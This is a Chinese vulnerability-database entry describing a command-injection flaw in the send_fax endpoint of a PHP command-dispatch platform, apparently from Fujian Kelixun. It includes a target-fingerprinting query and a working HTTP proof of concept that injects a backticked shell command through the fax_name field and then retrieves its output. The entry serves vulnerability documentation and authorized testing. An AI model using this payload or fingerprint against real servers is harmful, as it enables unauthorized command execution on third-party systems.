---
source: "wy876 漏洞文库"
title: "指挥调度平台PHP版（附件名指福建科立讯） send_fax fax_name命令注入"
product: "指挥调度平台PHP版（附件名指福建科立讯）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，Unix shell、传真转换/可写目录"
prerequisites: "POST无Cookie、取回GET带Cookie，权限未明"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ficwasc2nrssf2yb"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%9E%8D%E5%90%88%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0/%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0send_fax%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "</font>"
hunter: "web.body=\"app/structure/departments.php\""
id: "vw-2823c3443df8ec9f058a1259"
entity_id: "ve-2823c3443df8ec9f058a1259"
schema_version: "1"
---

# 指挥调度平台PHP版（附件名指福建科立讯） send_fax fax_name命令注入

## 条目说明

- 对象与具体问题：指挥调度平台PHP版（附件名指福建科立讯）；send_fax fax_name命令注入
- 版本、配置及部署条件：版本未知，Unix shell、传真转换/可写目录
- 认证与权限前提：POST无Cookie、取回GET带Cookie，权限未明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 请求阶段鉴权不一致，需分别验证，不能默认匿名
- 传真操作可能触发业务，加上whoami落盘有副作用，需安全说明/清理
- 附件名有厂商线索，未下载YAML；无完整输出或根因
- HTML污染fofa、影响版本节缺，无修复

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。指挥调度平台send_fax存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

## 三、资产测绘
+ hunter`web.body="app/structure/departments.php"`
+ 特征


## 四、漏洞复现
```http
POST /api/client/fax/send_fax.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1

fax_name=`whoami > 1.txt`.pdf
```

> 请求长度说明：原资料 Content-Length 为 29；静态长度已移除，应由客户端根据最终请求体的字节数生成。


获取命令执行结果

```http
GET /api/client/fax/1.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=9******************************2
Upgrade-Insecure-Requests: 1
```


[福建科立讯通信-指挥调度平台-send-fax-远程命令执行.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222143771-9a0b3a4a-d028-4593-a184-ee7c7d7dad61.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ficwasc2nrssf2yb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
